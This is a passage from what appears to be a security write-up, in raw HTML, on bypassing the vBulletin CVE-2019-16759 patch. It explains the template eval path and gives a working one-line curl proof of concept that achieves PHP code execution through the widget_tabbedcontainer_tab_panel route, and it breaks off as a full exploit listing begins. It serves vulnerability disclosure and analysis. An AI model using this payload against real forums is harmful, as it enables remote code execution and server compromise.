</pre></td><td class="code"><pre class="php" style="font-family:monospace;">		<span style="color: #339933;">&lt;</span>template name<span style="color: #339933;">=</span><span style="color: #0000ff;">&quot;widget_php&quot;</span> templatetype<span style="color: #339933;">=</span><span style="color: #0000ff;">&quot;template&quot;</span> <span style="color: #990000;">date</span><span style="color: #339933;">=</span><span style="color: #0000ff;">&quot;1569453621&quot;</span> username<span style="color: #339933;">=</span><span style="color: #0000ff;">&quot;vBulletin&quot;</span> version<span style="color: #339933;">=</span><span style="color: #0000ff;">&quot;5.5.5 Alpha 4&quot;</span><span style="color: #339933;">&gt;&lt;!</span><span style="color: #009900;">&#91;</span>CDATA<span style="color: #009900;">&#91;</span><span style="color: #339933;">&lt;</span>vb<span style="color: #339933;">:</span><span style="color: #b1b100;">if</span> condition<span style="color: #339933;">=</span><span style="color: #0000ff;">&quot;empty(<span style="color: #006699; font-weight: bold;">$widgetConfig</span>) AND !empty(<span style="color: #006699; font-weight: bold;">$widgetinstanceid</span>)&quot;</span><span style="color: #339933;">&gt;</span>
	<span style="color: #009900;">&#123;</span>vb<span style="color: #339933;">:</span>data widgetConfig<span style="color: #339933;">,</span> widget<span style="color: #339933;">,</span> fetchConfig<span style="color: #339933;">,</span> <span style="color: #009900;">&#123;</span>vb<span style="color: #339933;">:</span>raw widgetinstanceid<span style="color: #009900;">&#125;</span><span style="color: #009900;">&#125;</span>
<span style="color: #339933;">&lt;/</span>vb<span style="color: #339933;">:</span>if<span style="color: #339933;">&gt;</span>
&nbsp;
<span style="color: #339933;">&lt;</span>vb<span style="color: #339933;">:</span><span style="color: #b1b100;">if</span> condition<span style="color: #339933;">=</span><span style="color: #0000ff;">&quot;!empty(<span style="color: #006699; font-weight: bold;">$widgetConfig</span>)&quot;</span><span style="color: #339933;">&gt;</span>
	<span style="color: #009900;">&#123;</span>vb<span style="color: #339933;">:</span>set widgetid<span style="color: #339933;">,</span> <span style="color: #009900;">&#123;</span>vb<span style="color: #339933;">:</span>raw widgetConfig<span style="color: #339933;">.</span>widgetid<span style="color: #009900;">&#125;</span><span style="color: #009900;">&#125;</span>
	<span style="color: #009900;">&#123;</span>vb<span style="color: #339933;">:</span>set widgetinstanceid<span style="color: #339933;">,</span> <span style="color: #009900;">&#123;</span>vb<span style="color: #339933;">:</span>raw widgetConfig<span style="color: #339933;">.</span>widgetinstanceid<span style="color: #009900;">&#125;</span><span style="color: #009900;">&#125;</span>
<span style="color: #339933;">&lt;/</span>vb<span style="color: #339933;">:</span>if<span style="color: #339933;">&gt;</span>
&nbsp;
<span style="color: #339933;">&lt;</span>div <span style="color: #000000; font-weight: bold;">class</span><span style="color: #339933;">=</span><span style="color: #0000ff;">&quot;b-module{vb:var widgetConfig.show_at_breakpoints_css_classes} canvas-widget default-widget custom-html-widget&quot;</span> id<span style="color: #339933;">=</span><span style="color: #0000ff;">&quot;widget_{vb:raw widgetinstanceid}&quot;</span> data<span style="color: #339933;">-</span>widget<span style="color: #339933;">-</span>id<span style="color: #339933;">=</span><span style="color: #0000ff;">&quot;{vb:raw widgetid}&quot;</span> data<span style="color: #339933;">-</span>widget<span style="color: #339933;">-</span>instance<span style="color: #339933;">-</span>id<span style="color: #339933;">=</span><span style="color: #0000ff;">&quot;{vb:raw widgetinstanceid}&quot;</span><span style="color: #339933;">&gt;</span>
&nbsp;
	<span style="color: #009900;">&#123;</span>vb<span style="color: #339933;">:</span>template module_title<span style="color: #339933;">,</span>
		widgetConfig<span style="color: #339933;">=</span><span style="color: #009900;">&#123;</span>vb<span style="color: #339933;">:</span>raw widgetConfig<span style="color: #009900;">&#125;</span><span style="color: #339933;">,</span>
		show_title_divider<span style="color: #339933;">=</span><span style="color: #cc66cc;">1</span><span style="color: #339933;">,</span>
		can_use_sitebuilder<span style="color: #339933;">=</span><span style="color: #009900;">&#123;</span>vb<span style="color: #339933;">:</span>raw user<span style="color: #339933;">.</span>can_use_sitebuilder<span style="color: #009900;">&#125;</span><span style="color: #009900;">&#125;</span>
&nbsp;
	<span style="color: #339933;">&lt;</span>div <span style="color: #000000; font-weight: bold;">class</span><span style="color: #339933;">=</span><span style="color: #0000ff;">&quot;widget-content&quot;</span><span style="color: #339933;">&gt;</span>
		<span style="color: #339933;">&lt;</span>vb<span style="color: #339933;">:</span><span style="color: #b1b100;">if</span> condition<span style="color: #339933;">=</span><span style="color: #0000ff;">&quot;!empty(<span style="color: #006699; font-weight: bold;">$widgetConfig</span>['code']) AND !<span style="color: #006699; font-weight: bold;">$vboptions</span>['disable_php_rendering']&quot;</span><span style="color: #339933;">&gt;</span>
			<span style="color: #339933;">&lt;</span>vb<span style="color: #339933;">:</span>comment<span style="color: #339933;">&gt;</span>
				<span style="color: #b1b100;">Do</span> not <span style="color: #990000;">eval</span> anything other than the widgetConfig code <span style="color: #339933;">--</span> anything <span style="color: #b1b100;">else</span> could potentially come
				from a malicious user<span style="color: #339933;">.</span>  <span style="color: #b1b100;">Do</span> not <span style="color: #000000; font-weight: bold;">use</span> phpeval outside of this template<span style="color: #339933;">.</span>  Ever<span style="color: #339933;">.</span>
			<span style="color: #339933;">&lt;/</span>vb<span style="color: #339933;">:</span>comment<span style="color: #339933;">&gt;</span>
			<span style="color: #009900;">&#123;</span>vb<span style="color: #339933;">:</span>phpeval <span style="color: #009900;">&#123;</span>vb<span style="color: #339933;">:</span>raw widgetConfig<span style="color: #339933;">.</span>code<span style="color: #009900;">&#125;</span><span style="color: #009900;">&#125;</span>
		<span style="color: #339933;">&lt;</span>vb<span style="color: #339933;">:</span><span style="color: #b1b100;">else</span> <span style="color: #339933;">/&gt;</span>
			<span style="color: #339933;">&lt;</span>vb<span style="color: #339933;">:</span><span style="color: #b1b100;">if</span> condition<span style="color: #339933;">=</span><span style="color: #0000ff;">&quot;<span style="color: #006699; font-weight: bold;">$user</span>['can_use_sitebuilder']&quot;</span><span style="color: #339933;">&gt;</span>
				<span style="color: #339933;">&lt;</span>span <span style="color: #000000; font-weight: bold;">class</span><span style="color: #339933;">=</span><span style="color: #0000ff;">&quot;note&quot;</span><span style="color: #339933;">&gt;</span><span style="color: #009900;">&#123;</span>vb<span style="color: #339933;">:</span>phrase click_edit_to_config_module<span style="color: #009900;">&#125;</span><span style="color: #339933;">&lt;/</span>span<span style="color: #339933;">&gt;</span>
			<span style="color: #339933;">&lt;/</span>vb<span style="color: #339933;">:</span>if<span style="color: #339933;">&gt;</span>
		<span style="color: #339933;">&lt;/</span>vb<span style="color: #339933;">:</span>if<span style="color: #339933;">&gt;</span>
	<span style="color: #339933;">&lt;/</span>div<span style="color: #339933;">&gt;</span>
<span style="color: #339933;">&lt;/</span>div<span style="color: #339933;">&gt;</span><span style="color: #009900;">&#93;</span><span style="color: #009900;">&#93;</span><span style="color: #339933;">&gt;&lt;/</span>template<span style="color: #339933;">&gt;</span></pre></td></tr></table><p class="theCode" style="display:none;"> &lt;template name=&quot;widget_php&quot; templatetype=&quot;template&quot; date=&quot;1569453621&quot; username=&quot;vBulletin&quot; version=&quot;5.5.5 Alpha 4&quot;&gt;&lt;![CDATA[&lt;vb:if condition=&quot;empty($widgetConfig) AND !empty($widgetinstanceid)&quot;&gt;
{vb:data widgetConfig, widget, fetchConfig, {vb:raw widgetinstanceid}}
&lt;/vb:if&gt;
&lt;vb:if condition=&quot;!empty($widgetConfig)&quot;&gt;
{vb:set widgetid, {vb:raw widgetConfig.widgetid}}
{vb:set widgetinstanceid, {vb:raw widgetConfig.widgetinstanceid}}
&lt;/vb:if&gt;
&lt;div class=&quot;b-module{vb:var widgetConfig.show_at_breakpoints_css_classes} canvas-widget default-widget custom-html-widget&quot; id=&quot;widget_{vb:raw widgetinstanceid}&quot; data-widget-id=&quot;{vb:raw widgetid}&quot; data-widget-instance-id=&quot;{vb:raw widgetinstanceid}&quot;&gt;
{vb:template module_title,
widgetConfig={vb:raw widgetConfig},
show_title_divider=1,
can_use_sitebuilder={vb:raw user.can_use_sitebuilder}}
&lt;div class=&quot;widget-content&quot;&gt;
&lt;vb:if condition=&quot;!empty($widgetConfig['code']) AND !$vboptions['disable_php_rendering']&quot;&gt;
&lt;vb:comment&gt;
Do not eval anything other than the widgetConfig code -- anything else could potentially come
from a malicious user. Do not use phpeval outside of this template. Ever.
&lt;/vb:comment&gt;
{vb:phpeval {vb:raw widgetConfig.code}}
&lt;vb:else /&gt;
&lt;vb:if condition=&quot;$user['can_use_sitebuilder']&quot;&gt;
&lt;span class=&quot;note&quot;&gt;{vb:phrase click_edit_to_config_module}&lt;/span&gt;
&lt;/vb:if&gt;
&lt;/vb:if&gt;
&lt;/div&gt;
&lt;/div&gt;]]&gt;&lt;/template&gt;</p></div>
<p> This template would be rendered to the following PHP code.</p>
<div class="wp_syntax" style="position:relative;"><table><tr><td class="line_numbers"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre></td><td class="code"><pre class="php" style="font-family:monospace;"><span style="color: #000088;">$final_rendered</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">''</span> <span style="color: #339933;">.</span> <span style="color: #0000ff;">''</span><span style="color: #339933;">;</span> 
<span style="color: #b1b100;">if</span> <span style="color: #009900;">&#40;</span><span style="color: #990000;">empty</span><span style="color: #009900;">&#40;</span><span style="color: #000088;">$widgetConfig</span><span style="color: #009900;">&#41;</span> AND <span style="color: #339933;">!</span><span style="color: #990000;">empty</span><span style="color: #009900;">&#40;</span><span style="color: #000088;">$widgetinstanceid</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
  <span style="color: #000088;">$final_rendered</span> <span style="color: #339933;">.=</span> <span style="color: #0000ff;">'\r\n\t'</span> <span style="color: #339933;">.</span> <span style="color: #0000ff;">''</span><span style="color: #339933;">;</span> 
  <span style="color: #000088;">$widgetConfig</span> <span style="color: #339933;">=</span> vB5_Template_Runtime<span style="color: #339933;">::</span><span style="color: #004000;">parseData</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'widget'</span><span style="color: #339933;">,</span> <span style="color: #0000ff;">'fetchConfig'</span><span style="color: #339933;">,</span> <span style="color: #000088;">$widgetinstanceid</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
  <span style="color: #000088;">$final_rendered</span> <span style="color: #339933;">.=</span> <span style="color: #0000ff;">''</span> <span style="color: #339933;">.</span> <span style="color: #0000ff;">'\r\n'</span><span style="color: #339933;">;</span>\n\t\t\t\t
<span style="color: #009900;">&#125;</span> <span style="color: #b1b100;">else</span> <span style="color: #009900;">&#123;</span>
  <span style="color: #000088;">$final_rendered</span> <span style="color: #339933;">.=</span> <span style="color: #0000ff;">''</span><span style="color: #339933;">;</span>
<span style="color: #009900;">&#125;</span>
<span style="color: #000088;">$final_rendered</span> <span style="color: #339933;">.=</span> <span style="color: #0000ff;">''</span> <span style="color: #339933;">.</span> <span style="color: #0000ff;">'\r\n\r\n'</span> <span style="color: #339933;">.</span> <span style="color: #0000ff;">''</span><span style="color: #339933;">;</span>
<span style="color: #b1b100;">if</span> <span style="color: #009900;">&#40;</span><span style="color: #339933;">!</span><span style="color: #990000;">empty</span><span style="color: #009900;">&#40;</span><span style="color: #000088;">$widgetConfig</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
  <span style="color: #000088;">$final_rendered</span> <span style="color: #339933;">.=</span> <span style="color: #0000ff;">'\r\n\t'</span> <span style="color: #339933;">.</span> <span style="color: #0000ff;">''</span><span style="color: #339933;">;</span>
  <span style="color: #000088;">$widgetid</span> <span style="color: #339933;">=</span> <span style="color: #000088;">$widgetConfig</span><span style="color: #009900;">&#91;</span><span style="color: #0000ff;">'widgetid'</span><span style="color: #009900;">&#93;</span><span style="color: #339933;">;</span>
  <span style="color: #000088;">$final_rendered</span> <span style="color: #339933;">.=</span> <span style="color: #0000ff;">''</span> <span style="color: #339933;">.</span> <span style="color: #0000ff;">'\r\n\t'</span> <span style="color: #339933;">.</span> <span style="color: #0000ff;">''</span><span style="color: #339933;">;</span>
  <span style="color: #000088;">$widgetinstanceid</span> <span style="color: #339933;">=</span> <span style="color: #000088;">$widgetConfig</span><span style="color: #009900;">&#91;</span><span style="color: #0000ff;">'widgetinstanceid'</span><span style="color: #009900;">&#93;</span><span style="color: #339933;">;</span>
  <span style="color: #000088;">$final_rendered</span> <span style="color: #339933;">.=</span> <span style="color: #0000ff;">''</span> <span style="color: #339933;">.</span> <span style="color: #0000ff;">'\r\n'</span><span style="color: #339933;">;</span>\n\t\t\t\t
<span style="color: #009900;">&#125;</span> <span style="color: #b1b100;">else</span> <span style="color: #009900;">&#123;</span>
  <span style="color: #000088;">$final_rendered</span> <span style="color: #339933;">.=</span> <span style="color: #0000ff;">''</span><span style="color: #339933;">;</span>
<span style="color: #009900;">&#125;</span>
<span style="color: #000088;">$final_rendered</span> <span style="color: #339933;">.=</span> <span style="color: #0000ff;">''</span> <span style="color: #339933;">.</span> <span style="color: #0000ff;">'\r\n\r\n&lt;div class=&quot;b-module'</span> <span style="color: #339933;">.</span> vB5_Template_Runtime<span style="color: #339933;">::</span><span style="color: #004000;">vBVar</span><span style="color: #009900;">&#40;</span><span style="color: #000088;">$widgetConfig</span><span style="color: #009900;">&#91;</span><span style="color: #0000ff;">'show_at_breakpoints_css_classes'</span><span style="color: #009900;">&#93;</span><span style="color: #009900;">&#41;</span> <span style="color: #339933;">.</span> <span style="color: #0000ff;">' canvas-widget default-widget custom-html-widget&quot; id=&quot;widget_'</span> <span style="color: #339933;">.</span> <span style="color: #000088;">$widgetinstanceid</span> <span style="color: #339933;">.</span> <span style="color: #0000ff;">'&quot; data-widget-id=&quot;'</span> <span style="color: #339933;">.</span> <span style="color: #000088;">$widgetid</span> <span style="color: #339933;">.</span> <span style="color: #0000ff;">'&quot; data-widget-instance-id=&quot;'</span> <span style="color: #339933;">.</span> <span style="color: #000088;">$widgetinstanceid</span> <span style="color: #339933;">.</span> <span style="color: #0000ff;">'&quot;&gt;\r\n\r\n\t'</span> <span style="color: #339933;">.</span> vB5_Template_Runtime<span style="color: #339933;">::</span><span style="color: #004000;">includeTemplate</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'module_title'</span><span style="color: #339933;">,</span><span style="color: #990000;">array</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'widgetConfig'</span> <span style="color: #339933;">=&gt;</span> <span style="color: #000088;">$widgetConfig</span><span style="color: #339933;">,</span> <span style="color: #0000ff;">'show_title_divider'</span> <span style="color: #339933;">=&gt;</span> <span style="color: #0000ff;">'1'</span><span style="color: #339933;">,</span> <span style="color: #0000ff;">'can_use_sitebuilder'</span> <span style="color: #339933;">=&gt;</span> <span style="color: #000088;">$user</span><span style="color: #009900;">&#91;</span><span style="color: #0000ff;">'can_use_sitebuilder'</span><span style="color: #009900;">&#93;</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span> <span style="color: #339933;">.</span> <span style="color: #0000ff;">'\r\n\r\n\t&lt;div class=&quot;widget-content&quot;&gt;\r\n\t\t'</span> <span style="color: #339933;">.</span> <span style="color: #0000ff;">''</span><span style="color: #339933;">;</span>
&nbsp;
<span style="color: #b1b100;">if</span> <span style="color: #009900;">&#40;</span><span style="color: #339933;">!</span><span style="color: #990000;">empty</span><span style="color: #009900;">&#40;</span><span style="color: #000088;">$widgetConfig</span><span style="color: #009900;">&#91;</span><span style="color: #0000ff;">'code'</span><span style="color: #009900;">&#93;</span><span style="color: #009900;">&#41;</span> AND <span style="color: #339933;">!</span>vB<span style="color: #339933;">::</span><span style="color: #004000;">getDatastore</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">-&gt;</span><span style="color: #004000;">getOption</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'disable_php_rendering'</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
  <span style="color: #000088;">$final_rendered</span> <span style="color: #339933;">.=</span> <span style="color: #0000ff;">'\r\n\t\t\t'</span> <span style="color: #339933;">.</span> <span style="color: #0000ff;">''</span> <span style="color: #339933;">.</span> <span style="color: #0000ff;">'\r\n\t\t\t'</span> <span style="color: #339933;">.</span> vB5_Template_Runtime<span style="color: #339933;">::</span><span style="color: #004000;">evalPhp</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">''</span> <span style="color: #339933;">.</span> <span style="color: #000088;">$widgetConfig</span><span style="color: #009900;">&#91;</span><span style="color: #0000ff;">'code'</span><span style="color: #009900;">&#93;</span> <span style="color: #339933;">.</span> <span style="color: #0000ff;">''</span><span style="color: #009900;">&#41;</span> <span style="color: #339933;">.</span> <span style="color: #0000ff;">'\r\n\t\t'</span><span style="color: #339933;">;</span>
<span style="color: #009900;">&#125;</span> <span style="color: #b1b100;">else</span> <span style="color: #009900;">&#123;</span>
  <span style="color: #000088;">$final_rendered</span> <span style="color: #339933;">.=</span> <span style="color: #0000ff;">'\r\n\t\t\t'</span> <span style="color: #339933;">.</span> <span style="color: #0000ff;">''</span><span style="color: #339933;">;</span>
  <span style="color: #b1b100;">if</span> <span style="color: #009900;">&#40;</span><span style="color: #000088;">$user</span><span style="color: #009900;">&#91;</span><span style="color: #0000ff;">'can_use_sitebuilder'</span><span style="color: #009900;">&#93;</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
    <span style="color: #000088;">$final_rendered</span> <span style="color: #339933;">.=</span> <span style="color: #0000ff;">'\r\n\t\t\t\t&lt;span class=&quot;note&quot;&gt;'</span> <span style="color: #339933;">.</span> vB5_Template_Runtime<span style="color: #339933;">::</span><span style="color: #004000;">parsePhrase</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">&quot;click_edit_to_config_module&quot;</span><span style="color: #009900;">&#41;</span> <span style="color: #339933;">.</span> <span style="color: #0000ff;">'&lt;/span&gt;\r\n\t\t\t'</span><span style="color: #339933;">;</span>
  <span style="color: #009900;">&#125;</span> <span style="color: #b1b100;">else</span> <span style="color: #009900;">&#123;</span>
    <span style="color: #000088;">$final_rendered</span> <span style="color: #339933;">.=</span> <span style="color: #0000ff;">''</span><span style="color: #339933;">;</span>
  <span style="color: #009900;">&#125;</span>
  <span style="color: #000088;">$final_rendered</span> <span style="color: #339933;">.=</span> <span style="color: #0000ff;">''</span> <span style="color: #339933;">.</span> <span style="color: #0000ff;">'\r\n\t\t'</span><span style="color: #339933;">;</span>
<span style="color: #009900;">&#125;</span>
<span style="color: #000088;">$final_rendered</span> <span style="color: #339933;">.=</span> <span style="color: #0000ff;">''</span> <span style="color: #339933;">.</span> <span style="color: #0000ff;">'\r\n\t&lt;/div&gt;\r\n&lt;/div&gt;'</span><span style="color: #339933;">;</span></pre></td></tr></table><p class="theCode" style="display:none;">$final_rendered = '' . '';
if (empty($widgetConfig) AND !empty($widgetinstanceid)) {
$final_rendered .= '\r\n\t' . '';
$widgetConfig = vB5_Template_Runtime::parseData('widget', 'fetchConfig', $widgetinstanceid);
$final_rendered .= '' . '\r\n';\n\t\t\t\t
} else {
$final_rendered .= '';
}
$final_rendered .= '' . '\r\n\r\n' . '';
if (!empty($widgetConfig)) {
$final_rendered .= '\r\n\t' . '';
$widgetid = $widgetConfig['widgetid'];
$final_rendered .= '' . '\r\n\t' . '';
$widgetinstanceid = $widgetConfig['widgetinstanceid'];
$final_rendered .= '' . '\r\n';\n\t\t\t\t
} else {
$final_rendered .= '';
}
$final_rendered .= '' . '\r\n\r\n&lt;div class=&quot;b-module' . vB5_Template_Runtime::vBVar($widgetConfig['show_at_breakpoints_css_classes']) . ' canvas-widget default-widget custom-html-widget&quot; id=&quot;widget_' . $widgetinstanceid . '&quot; data-widget-id=&quot;' . $widgetid . '&quot; data-widget-instance-id=&quot;' . $widgetinstanceid . '&quot;&gt;\r\n\r\n\t' . vB5_Template_Runtime::includeTemplate('module_title',array('widgetConfig' =&gt; $widgetConfig, 'show_title_divider' =&gt; '1', 'can_use_sitebuilder' =&gt; $user['can_use_sitebuilder'])) . '\r\n\r\n\t&lt;div class=&quot;widget-content&quot;&gt;\r\n\t\t' . '';
if (!empty($widgetConfig['code']) AND !vB::getDatastore()-&gt;getOption('disable_php_rendering')) {
$final_rendered .= '\r\n\t\t\t' . '' . '\r\n\t\t\t' . vB5_Template_Runtime::evalPhp('' . $widgetConfig['code'] . '') . '\r\n\t\t';
} else {
$final_rendered .= '\r\n\t\t\t' . '';
if ($user['can_use_sitebuilder']) {
$final_rendered .= '\r\n\t\t\t\t&lt;span class=&quot;note&quot;&gt;' . vB5_Template_Runtime::parsePhrase(&quot;click_edit_to_config_module&quot;) . '&lt;/span&gt;\r\n\t\t\t';
} else {
$final_rendered .= '';
}
$final_rendered .= '' . '\r\n\t\t';
}
$final_rendered .= '' . '\r\n\t&lt;/div&gt;\r\n&lt;/div&gt;';</p></div>
<p>Then after being rendered, when the code is later pushed through the eval process, the other portion of its child templates are loaded and also ran through eval.</p>
<p>This type of system may seem innocuous to the untrained eye but the approach opens up a number of issues beyond just the insecure uses of an eval calls. </p>
<p>Regardless, here are a few ways this can fail. </p>
<ul><li>Any non-filtered modifications to the output variable will open up the code for another code execution.</li><li>Constant filtering required of all template code for situations which can create non-escaped PHP.</li><li>XSS filtering nightmares</li><li>Included child code will have access to parent declared variables.</li></ul>
<p>I cannot think of many situations where this would be the optimal approach. However, to keep this analysis to the point, I&#8217;ll focus on the issues leading to a bypass.</p>
<h2>Bypassing CVE-2019-16759</h2>
<p>The patch code mentioned in one of the previous sections above may seem thorough, but the approach is actually somewhat short sighted. Specifically, the patch faces issues when encountering a user controlled child template in that a parent template will be checked to verify that the routestring does not end with a widget_php route. However we are still prevented from providing a payload within the widgetConfig value because of code within the rendering process, which cleans the widgetConfig value prior to the templates execution. This problem is remedied for us because of a lucky solution manifesting in the following template.</p>
<div class="wp_syntax" style="position:relative;"><table><tr><td class="line_numbers"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="code"><pre class="php" style="font-family:monospace;">		<span style="color: #339933;">&lt;</span>template name<span style="color: #339933;">=</span><span style="color: #0000ff;">&quot;widget_tabbedcontainer_tab_panel&quot;</span> templatetype<span style="color: #339933;">=</span><span style="color: #0000ff;">&quot;template&quot;</span> <span style="color: #990000;">date</span><span style="color: #339933;">=</span><span style="color: #0000ff;">&quot;1532130449&quot;</span> username<span style="color: #339933;">=</span><span style="color: #0000ff;">&quot;vBulletin&quot;</span> version<span style="color: #339933;">=</span><span style="color: #0000ff;">&quot;5.4.4 Alpha 2&quot;</span><span style="color: #339933;">&gt;&lt;!</span><span style="color: #009900;">&#91;</span>CDATA<span style="color: #009900;">&#91;</span><span style="color: #009900;">&#123;</span>vb<span style="color: #339933;">:</span>set panel_id<span style="color: #339933;">,</span> <span style="color: #009900;">&#123;</span>vb<span style="color: #339933;">:</span>concat <span style="color: #009900;">&#123;</span>vb<span style="color: #339933;">:</span><span style="color: #000000; font-weight: bold;">var</span> id_prefix<span style="color: #009900;">&#125;</span><span style="color: #339933;">,</span> <span style="color: #009900;">&#123;</span>vb<span style="color: #339933;">:</span><span style="color: #000000; font-weight: bold;">var</span> tab_num<span style="color: #009900;">&#125;</span><span style="color: #009900;">&#125;</span><span style="color: #009900;">&#125;</span>
<span style="color: #339933;">&lt;</span>div id<span style="color: #339933;">=</span><span style="color: #0000ff;">&quot;{vb:var panel_id}&quot;</span> <span style="color: #000000; font-weight: bold;">class</span><span style="color: #339933;">=</span><span style="color: #0000ff;">&quot;h-clearfix js-show-on-tabs-create h-hide&quot;</span><span style="color: #339933;">&gt;</span>
	<span style="color: #339933;">&lt;</span>vb<span style="color: #339933;">:</span>comment<span style="color: #339933;">&gt;</span>
	<span style="color: #339933;">-</span> <span style="color: #009900;">&#123;</span>vb<span style="color: #339933;">:</span><span style="color: #000000; font-weight: bold;">var</span> panel_id<span style="color: #009900;">&#125;</span> 
	<span style="color: #339933;">&lt;</span>vb<span style="color: #339933;">:</span><span style="color: #990000;">each</span> from<span style="color: #339933;">=</span><span style="color: #0000ff;">&quot;subWidgets&quot;</span> value<span style="color: #339933;">=</span><span style="color: #0000ff;">&quot;subWidget&quot;</span><span style="color: #339933;">&gt;</span>
	<span style="color: #339933;">&amp;</span>nbsp<span style="color: #339933;">;&amp;</span>nbsp<span style="color: #339933;">;--</span> <span style="color: #009900;">&#123;</span>vb<span style="color: #339933;">:</span>raw subWidget<span style="color: #339933;">.</span>template<span style="color: #009900;">&#125;</span>
	<span style="color: #339933;">&lt;/</span>vb<span style="color: #339933;">:</span>each<span style="color: #339933;">&gt;</span>
	<span style="color: #339933;">&lt;/</span>vb<span style="color: #339933;">:</span>comment<span style="color: #339933;">&gt;</span>
&nbsp;
	<span style="color: #339933;">&lt;</span>vb<span style="color: #339933;">:</span><span style="color: #990000;">each</span> from<span style="color: #339933;">=</span><span style="color: #0000ff;">&quot;subWidgets&quot;</span> value<span style="color: #339933;">=</span><span style="color: #0000ff;">&quot;subWidget&quot;</span><span style="color: #339933;">&gt;</span>
		<span style="color: #009900;">&#123;</span>vb<span style="color: #339933;">:</span>template <span style="color: #009900;">&#123;</span>vb<span style="color: #339933;">:</span>raw subWidget<span style="color: #339933;">.</span>template<span style="color: #009900;">&#125;</span><span style="color: #339933;">,</span> 
			widgetConfig<span style="color: #339933;">=</span><span style="color: #009900;">&#123;</span>vb<span style="color: #339933;">:</span>raw subWidget<span style="color: #339933;">.</span>config<span style="color: #009900;">&#125;</span><span style="color: #339933;">,</span> 
			widgetinstanceid<span style="color: #339933;">=</span><span style="color: #009900;">&#123;</span>vb<span style="color: #339933;">:</span>raw subWidget<span style="color: #339933;">.</span>widgetinstanceid<span style="color: #009900;">&#125;</span><span style="color: #339933;">,</span>
			widgettitle<span style="color: #339933;">=</span><span style="color: #009900;">&#123;</span>vb<span style="color: #339933;">:</span>raw subWidget<span style="color: #339933;">.</span>title<span style="color: #009900;">&#125;</span><span style="color: #339933;">,</span> 
			tabbedContainerSubModules<span style="color: #339933;">=</span><span style="color: #009900;">&#123;</span>vb<span style="color: #339933;">:</span>raw subWidget<span style="color: #339933;">.</span>tabbedContainerSubModules<span style="color: #009900;">&#125;</span><span style="color: #339933;">,</span>
			product<span style="color: #339933;">=</span><span style="color: #009900;">&#123;</span>vb<span style="color: #339933;">:</span>raw subWidget<span style="color: #339933;">.</span>product<span style="color: #009900;">&#125;</span>
		<span style="color: #009900;">&#125;</span>
	<span style="color: #339933;">&lt;/</span>vb<span style="color: #339933;">:</span>each<span style="color: #339933;">&gt;</span>
&nbsp;
&nbsp;
<span style="color: #339933;">&lt;/</span>div<span style="color: #339933;">&gt;</span><span style="color: #009900;">&#93;</span><span style="color: #009900;">&#93;</span><span style="color: #339933;">&gt;&lt;/</span>template<span style="color: #339933;">&gt;</span></pre></td></tr></table><p class="theCode" style="display:none;"> &lt;template name=&quot;widget_tabbedcontainer_tab_panel&quot; templatetype=&quot;template&quot; date=&quot;1532130449&quot; username=&quot;vBulletin&quot; version=&quot;5.4.4 Alpha 2&quot;&gt;&lt;![CDATA[{vb:set panel_id, {vb:concat {vb:var id_prefix}, {vb:var tab_num}}}
&lt;div id=&quot;{vb:var panel_id}&quot; class=&quot;h-clearfix js-show-on-tabs-create h-hide&quot;&gt;
&lt;vb:comment&gt;
- {vb:var panel_id}
&lt;vb:each from=&quot;subWidgets&quot; value=&quot;subWidget&quot;&gt;
&amp;nbsp;&amp;nbsp;-- {vb:raw subWidget.template}
&lt;/vb:each&gt;
&lt;/vb:comment&gt;
&lt;vb:each from=&quot;subWidgets&quot; value=&quot;subWidget&quot;&gt;
{vb:template {vb:raw subWidget.template},
widgetConfig={vb:raw subWidget.config},
widgetinstanceid={vb:raw subWidget.widgetinstanceid},
widgettitle={vb:raw subWidget.title},
tabbedContainerSubModules={vb:raw subWidget.tabbedContainerSubModules},
product={vb:raw subWidget.product}
}
&lt;/vb:each&gt;
&lt;/div&gt;]]&gt;&lt;/template&gt;</p></div>
<p>The template &#8220;widget_tabbedcontainer_tab_panel&#8221;, which is displayed above is a perfect assistant in bypassing the previous CVE-2019-16759 patch because of two key features. </p>
<ol><li>The templates ability to load a user controlled child template.</li><li>The template loads the child template by taking a value from a separately named value and placing it into a variable named &#8220;widgetConfig&#8221;.</li></ol>
<p><strong>These two characteristics of the &#8220;widget_tabbedcontainer_tab_panel&#8221; template allow us to effectively bypass all filtering previously done to prevent CVE-2019-16759 from being exploited.</strong></p>
<h2>PoC</h2>
<p>Because of the vulnerabilities simplicity, creating a one line command line exploit is as simple as the following.</p>
<div class="wp_syntax" style="position:relative;"><table><tr><td class="line_numbers"><pre>1
</pre></td><td class="code"><pre class="bash" style="font-family:monospace;">curl <span style="color: #660033;">-s</span> http:<span style="color: #000000; font-weight: bold;">//</span>EXAMPLE.COM<span style="color: #000000; font-weight: bold;">/</span>ajax<span style="color: #000000; font-weight: bold;">/</span>render<span style="color: #000000; font-weight: bold;">/</span>widget_tabbedcontainer_tab_panel <span style="color: #660033;">-d</span> <span style="color: #ff0000;">'subWidgets[0][template]=widget_php&amp;subWidgets[0][config][code]=phpinfo();'</span></pre></td></tr></table><p class="theCode" style="display:none;">curl -s http://EXAMPLE.COM/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&amp;subWidgets[0][config][code]=phpinfo();'</p></div>
<h2>Full Exploit(s)</h2>
<p>Below is a list of a few full exploit payloads written in multiple different languages including Bash, Python and Ruby.</p>
<h3>Bash Exploit</h3>
<div class="wp_syntax" style="position:relative;"><table><tr><td class="line_numbers"><pre>1
2
3
4
